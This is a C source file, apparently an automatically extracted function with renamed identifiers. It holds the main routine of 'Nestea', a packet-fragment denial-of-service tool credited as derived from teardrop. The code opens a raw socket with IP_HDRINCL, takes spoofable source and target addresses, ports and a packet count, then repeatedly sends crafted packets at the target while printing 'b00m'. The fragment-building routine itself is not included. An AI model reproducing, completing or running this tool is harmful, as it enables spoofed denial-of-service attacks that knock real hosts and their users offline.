#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int u_short ;
typedef  void* u_long ;
typedef  int /*<<< orphan*/  time_t ;
struct in_addr {void* s_addr; } ;
typedef  int /*<<< orphan*/  one ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int COUNT ; 
 int EOF ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_RAW ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC3 (int,char**,char*) ; 
 char* FUNC4 (struct in_addr) ; 
 void* FUNC5 (char*) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (int,void*,void*,int,int) ; 
 scalar_t__ FUNC9 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int) ; 
 int FUNC10 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (unsigned int) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ FUNC12 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 
 int /*<<< orphan*/  FUNC14 (int) ; 

int FUNC15(int argc, char **argv)
{
int one = 1, count = 0, i, rip_sock;
u_long src_ip = 0, dst_ip = 0;
u_short src_prt = 0, dst_prt = 0;
struct in_addr addr;


if((rip_sock = FUNC10(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
{
FUNC6("raw socket");
FUNC1(1);
}
if (FUNC9(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
< 0)
{
FUNC6("IP_HDRINCL");
FUNC1(1);
}
if (argc < 3) FUNC13(argv[0]);
if (!(src_ip = FUNC5(argv[1])) || !(dst_ip = FUNC5(argv[2])))
{
FUNC2(stderr, "What the hell kind of IP address is that?\n");
FUNC1(1);
}

while ((i = FUNC3(argc, argv, "s:t:n:")) != EOF)
{
switch (i)
{
case 's': /* source port (should be emphemeral) */
src_prt = (u_short)FUNC0(optarg);
break;
case 't': /* dest port (DNS, anyone?) */
dst_prt = (u_short)FUNC0(optarg);
break;
case 'n': /* number to send */
count = FUNC0(optarg);
break;
default :
FUNC13(argv[0]);
break; /* NOTREACHED */
}
}
FUNC11((unsigned)(FUNC12((time_t)0)));
if (!src_prt) src_prt = (FUNC7() % 0xffff);
if (!dst_prt) dst_prt = (FUNC7() % 0xffff);
if (!count) count = COUNT;

FUNC2(stderr, "Nestea by humble\nCode ripped from teardrop by route / daemon9\n");
FUNC2(stderr, "Death on flaxen wings (yet again):\n");
addr.s_addr = src_ip;
FUNC2(stderr, "From: %15s.%5d\n", FUNC4(addr), src_prt);
addr.s_addr = dst_ip;
FUNC2(stderr, " To: %15s.%5d\n", FUNC4(addr), dst_prt);
FUNC2(stderr, " Amt: %5d\n", count);
FUNC2(stderr, "[ ");

for (i = 0; i < count; i++)
{
FUNC8(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
FUNC2(stderr, "b00m ");
FUNC14(500);
}
FUNC2(stderr, "]\n");
return (0);
}